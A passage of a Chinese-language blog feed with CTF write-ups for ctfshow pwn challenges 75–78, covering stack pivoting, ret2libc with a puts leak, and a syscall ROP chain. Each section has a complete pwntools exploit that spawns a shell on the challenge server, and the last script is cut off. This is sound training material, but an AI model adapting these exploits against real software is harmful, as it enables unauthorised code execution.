        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow刷题记录</title>
      <link href="/2025/04/02/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/04/02/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn75栈迁移"><a href="#pwn75栈迁移" class="headerlink" title="pwn75栈迁移"></a>pwn75栈迁移</h1><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>题目提示”栈空间不够怎么办”，可以用栈迁移</p><p>栈迁移原理是利用两次leave ret先将ebp的值修改为输入shell的地址，再利用第二次leave ret将esp的值改为ebp的值，pop ebp将此时栈顶的值弹入ebp中，<code>esp+4</code>执行<code>ret</code>也就是pop eip将当前栈顶内容弹入执行流，使我们压在栈上非返回地址处的地址也可以执行达到控制执行流的效果</p><p>观察程序</p><p>漏洞函数：ctfshow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome, %s\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to do?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Nothing here ,%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次输入，但是只有8个溢出字节，显然不太够用所以想到第一次read泄露ebp的值，第二次read将get shell程序写到栈上最后两次leave ret返回起始输入地址执行代码</p><p>第一次read</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>-<span class="number">1</span>)+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">ebp_addr=u32(io.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ebp&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(ebp_addr))</span><br></pre></td></tr></table></figure><p>注意，在ida中s虽然只有36个字节的空间，但是其到ebp的距离仍然是0x28，不要写成36了</p><p>得到ebp地址是为了计算栈上起始输入数据存放的地址</p><p>第二次read</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s_addr=ebp_addr-<span class="number">0x38</span></span><br><span class="line">sh_addr=s_addr+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;aaaa&#x27;</span>+p32(system)+p32(<span class="number">0</span>)+p32(sh_addr)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p32(s_addr)+p32(leave_ret)</span><br></pre></td></tr></table></figure><p>程序里有system函数我们直接用即可，但是没有&#x2F;bin&#x2F;sh所以需要手动压入&#x2F;bin&#x2F;sh其中s_addr即为起始输入地址，用其覆盖掉ebp再将返回地址修改为leave ret加上函数调用结尾自带的leave ret即可达成栈迁移</p><p>我们利用gdb进行调试来确定二者的偏移</p><p><img src="/../images/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/75.png" alt="1"></p><p>输入aaaa后可以看到输入位于0xffffd160处，ebp的值为0xffffd198此处注意我们最后修改的是ebp的值而不是ebp的地址所以此处偏移是用ebp的值减去输入位置的地址即0x38</p><p>因为迁移后esp会加4故前4个地址无效</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28252</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>-<span class="number">1</span>)+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">ebp_addr=u32(io.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ebp&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">leave_ret=<span class="number">0x08048766</span></span><br><span class="line">system=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">s_addr=ebp_addr-<span class="number">0x38</span></span><br><span class="line">sh_addr=s_addr+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;aaaa&#x27;</span>+p32(system)+p32(<span class="number">0</span>)+p32(sh_addr)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p32(s_addr)+p32(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn76栈迁移"><a href="#pwn76栈迁移" class="headerlink" title="pwn76栈迁移"></a>pwn76栈迁移</h1><p>check</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>程序静态链接，进入程序观察实际没开canary,自带shell需要满足一定条件才能执行，也对应了提示中的叫我们理清逻辑</p><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+4h] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+18h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">30</span>]; <span class="comment">// [esp+1Eh] [ebp-22h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;CTFshow login: &quot;</span>, v4);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%30s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0xC</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = Base64Decode(s, &amp;v5);                    <span class="comment">// v7 = s经过base64解码的长度且要小于等于12</span></span><br><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0xC</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input Error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(input, v5, v7);</span><br><span class="line">    <span class="keyword">if</span> ( auth(v7) == <span class="number">1</span> )</span><br><span class="line">      correct();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Base64Decode函数也就是解码s并将解码后数据存入v5，后边又使用memcpy copy到input中，此处的Base64Decode函数不确定的话可以动调输点东西看看是不是</p><p>想要get shell需要进入到correct函数，且input 等于0xDEADBEEF</p><p>想要进入correct函数需要<code>auth(v7)==1</code></p><p>auth()函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">auth</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *s2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">8</span>]; <span class="comment">// [esp+20h] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(v4, input, a1);</span><br><span class="line">  s2 = calc_md5(v2, <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hash : %s\n&quot;</span>, s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="string">&quot;f87cd601aa7fedca99018a8be88eda34&quot;</span>, s2) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回值为strcmp的返回值是否等于0如果等于则返回1不等于则返回0要想<code>auth(v7)==1</code>就需要保证<code>s2=f87cd601aa7fedca99018a8be88eda34</code>接下来思考如何将s2的值改为这串字符</p><p><code>memcpy(v4, input, a1);</code>表示将input处的a1个字节复制给v4此处有4个字节的溢出刚好可以覆盖ebp可以考虑栈迁移，无法改到v2所以想要达成源码条件执行shell就不太可能了</p><p><code>s2 = calc_md5(v2, 12);</code>s2的内容由calc_md5()这个函数决定</p><p>calc_md5()函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a1==v2 a2==12</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">calc_md5</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [esp+1Ch] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">92</span>]; <span class="comment">// [esp+2Ch] [ebp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+88h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">33</span>);</span><br><span class="line">  MD5_Init(v4);</span><br><span class="line">  <span class="keyword">while</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt;= <span class="number">512</span> )</span><br><span class="line">      MD5_Update(v4, a1, a2);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      MD5_Update(v4, a1, <span class="number">512</span>);</span><br><span class="line">    a2 -= <span class="number">512</span>;</span><br><span class="line">    a1 += <span class="number">512</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  MD5_Final(v3, v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    <span class="built_in">snprintf</span>(<span class="number">2</span> * i + v5, <span class="number">32</span>, <span class="string">&quot;%02x&quot;</span>, v3[i]);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数用于计算一个数据块的MD5哈希值，a1为指向需要计算哈希值的数据块的起始地址，a2为从a1指向的地址开始的数据块的长度，最后返回算出的哈希值</p><p>通过满足程序逻辑来获得shell不太容易所以选择用栈迁移，所以将shell布置在input上，通过栈迁移迁移到input上执行</p><p>两次leave ret第一次是auth中的leave ret将input的地址弹到ebp中，第二次leave ret是main函数中的将input的地址mov到esp，pop ebp接着ret shell。函数又涉及base64又涉及哈希值看起来很麻烦但是实际上就是一个栈迁移</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28157</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./1.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(4)</span></span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x08049284</span></span><br><span class="line"><span class="built_in">input</span> = <span class="number">0x0811EB40</span> </span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(shell) + p32(<span class="built_in">input</span>)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn77寻址数组"><a href="#pwn77寻址数组" class="headerlink" title="pwn77寻址数组"></a>pwn77寻址数组</h1><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>只开了nx</p><p>漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">267</span>]; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+10Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+10Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(<span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v0 = v4++;</span><br><span class="line">    v2[v0] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v4;</span><br><span class="line">  v2[v4] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会一个一个字节的从标准输入流获取输入到v2中，可以先用puts泄露libc</p><p>但是要注意v4的值v4索引数组覆盖0x10C后到v4的值此时v4为0x10C将其覆盖为0x118即可索引到返回地址处</p><p>注意要堆栈对齐，64位ubuntu系统调用system函数时是需要栈对齐的。再具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐，说简单一点就是在将要调用system函数的时候，rsp指向的地址末尾需是0</p><p>libc：<a href="https://libc.blukat.me/?q=puts:970&l=libc6_2.27-3ubuntu1.6_amd64">libc database search</a></p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28196</span>)</span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./1.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4008e3</span></span><br><span class="line">ret = <span class="number">0x400576</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">0x4</span>)+<span class="string">b&#x27;\x18&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;T^T&#x27;</span>,payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">0x4</span>)+<span class="string">b&#x27;\x18&#x27;</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(ret)+p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;T^T&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn78-64位系统调用"><a href="#pwn78-64位系统调用" class="headerlink" title="pwn78 64位系统调用"></a>pwn78 64位系统调用</h1><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>程序静态链接有明显栈溢出有很多gadget可以用所以不用mprotect也可以直接构造rop链先调用read读入<code>/bin/sh</code>再调用<code>execve(&#39;bin/sh&#39;,0,0)</code></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28109</span>)</span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(4) </span></span><br><span class="line">syscall_ret = <span class="number">0x45BAC5</span></span><br><span class="line">pop_rdi = <span class="number">0x4016c3</span></span><br><span class="line">pop_rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">pop_rax = <span class="number">0x46b9f8</span></span><br><span class="line">bss = <span class="number">0x6c2000</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">0x8</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdx_rsi)+p64(<span class="number">0x10</span>)+p64(bss)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(pop_rdx_rsi)+p64(<span class="number">0</span>)+p64(<span 